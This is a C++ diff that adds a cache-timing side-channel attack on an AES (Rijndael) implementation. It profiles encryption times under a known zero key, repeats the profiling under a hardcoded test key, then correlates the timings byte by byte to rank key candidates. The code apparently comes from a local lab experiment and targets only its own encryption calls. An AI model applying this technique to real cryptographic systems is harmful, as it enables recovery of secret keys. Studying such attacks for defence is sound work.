@@ -7,6 +7,7 @@
 #include <cmath>
 #include <cstdio>
 #include <cstdlib>
+#include <time.h>
 
 using namespace std;
 double conversion_factor;
@@ -100,31 +101,129 @@ void test() {
 }
 
 void cacheAttack() {
+	const int KEY_SIZE = 16;
+	const int CHAR_SIZE = 255;
+	const int ATTACK_NUM = 100111;
+	
+	//Init models and keys
 	CRijndael studyPhase;
-	char studyKey[16];
-	for(int i = 0; i < 16; i ++)
+	char studyKey[KEY_SIZE + 1];
+	for(int i = 0; i < KEY_SIZE; i ++)
 		studyKey[i] = 0;
-	studyPhase.MakeKey(studyKey, 16, 16);
+	studyPhase.MakeKey(studyKey, KEY_SIZE, KEY_SIZE);
 	
 	CRijndael attackPhase;
 	char attackKey[] = "abcdefgh12345678";
-	attackPhase.MakeKey(attackKey, 16, 16);
+	attackPhase.MakeKey(attackKey, KEY_SIZE, KEY_SIZE);
 	
-	int attackNum = 1;
-	for(int attackNo = 0; attackNo < attackNum; attackNo ++) {
-		char plainText[] = "12345678abcdefgh";
-		char encryptedText[16];
+	//Initialization
+	double t1[20][1011];
+	double t2[20][1011];
+	int n1[20][1011];
+	int n2[20][1011];
+	double v1[20][1011];
+	double v2[20][1011];
+	
+	memset(t1, 0, sizeof(t1));
+	memset(t2, 0, sizeof(t2));
+	memset(n1, 0, sizeof(n1));
+	memset(n2, 0, sizeof(n2));
+	memset(v1, 0, sizeof(v1));
+	memset(v2, 0, sizeof(v2));
+	
+	double sumT1 = 0;
+	double sumN1 = 0;
+	double sumT2 = 0;
+	double sumN2 = 0;
+	
+	srand(time(NULL));
+	
+	//Study Phase
+	for(int attackNo = 0; attackNo < ATTACK_NUM; attackNo ++) {
+		char plainText[KEY_SIZE + 1];
+		char encryptedText[KEY_SIZE + 1];
+		
+		for(int i = 0; i < KEY_SIZE; i ++)
+			plainText[i] = rand() % CHAR_SIZE;
 		
 		long long measure1 = mach_absolute_time();
-		studyPhase.Encrypt(plainText, encryptedText, 16);
+		studyPhase.Encrypt(plainText, encryptedText, KEY_SIZE);
 		long long measure2 = mach_absolute_time();
 		
 		double duration_ns = (double)(measure2 - measure1) * conversion_factor;
+		
+//		cout << attackNo << ": " << duration_ns << endl;
+		
+		if (attackNo > 10) {
+			for(int i = 0; i < KEY_SIZE; i ++) {
+				t1[i][encryptedText[i]] += duration_ns;
+				sumT1 += duration_ns;
+				n1[i][encryptedText[i]] ++;
+				sumN1 ++;
+			}
+		}
+	}
+	
+	for(int i = 0; i < KEY_SIZE; i ++)
+		for(int j = 0; j < CHAR_SIZE; j ++) {
+			if (n1[i][j] > 0) {
+				v1[i][j] = t1[i][j] / n1[i][j] - sumT1 / sumN1;
+			}
+		}
+	
+	//Attack phase
+
+	for(int attackNo = 0; attackNo < ATTACK_NUM; attackNo ++) {
+		char plainText[KEY_SIZE + 1];
+		char encryptedText[KEY_SIZE + 1];
+		
+		for(int i = 0; i < KEY_SIZE; i ++)
+			plainText[i] = rand() % CHAR_SIZE;
+		
+		long long measure1 = mach_absolute_time();
+		attackPhase.Encrypt(plainText, encryptedText, KEY_SIZE);
+		long long measure2 = mach_absolute_time();
+		
+		double duration_ns = (double)(measure2 - measure1) * conversion_factor;
+		
+//		cout << attackNo << ": " << duration_ns << endl;
+		
+		if (attackNo > 10) {
+			for(int i = 0; i < KEY_SIZE; i ++) {
+				t2[i][encryptedText[i]] += duration_ns;
+				sumT2 += duration_ns;
+				n2[i][encryptedText[i]] ++;
+				sumN2 ++;
+			}
+		}
+	}
+	
+	for(int i = 0; i < KEY_SIZE; i ++)
+		for(int j = 0; j < CHAR_SIZE; j ++) {
+			if (n2[i][j] > 0) {
+				v2[i][j] = t2[i][j] / n2[i][j] - sumT2 / sumN2;
+			}
+		}
+	
+	double c[20][1011];
+	for(int i = 0; i < KEY_SIZE; i ++) {
+		double maxNum = 0;
+		for(int b = 0; b < CHAR_SIZE; b ++) {
+			c[i][b] = 0;
+			for(int j = 0; j < CHAR_SIZE; j ++)
+				c[i][b] += v1[i][j] * v2[i][j ^ b];
+			if (c[i][b] > maxNum)
+				maxNum = c[i][b];
+		}
+		cout << "i: " << i << endl;
+		cout << maxNum << " " << c[i][attackKey[i]] << endl;
 	}
 	
 }
 
 int main() {
+	Init();
+	cacheAttack();
 	return 0;
 }
 
